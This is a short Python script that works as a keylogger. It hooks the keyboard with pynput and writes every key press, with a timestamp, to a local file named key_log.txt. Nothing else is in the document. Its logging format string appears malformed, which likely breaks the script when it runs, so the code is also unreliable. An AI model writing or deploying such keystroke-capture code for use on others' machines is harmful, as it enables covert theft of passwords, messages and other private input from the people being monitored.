from pynput.keyboard import Key, Listener
import logging

log_dir =""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)9: %(message)s')

def on_press(key):
    logging.info(key)


with Listener(on_press = on_press) as listener:
    listener.join()
    
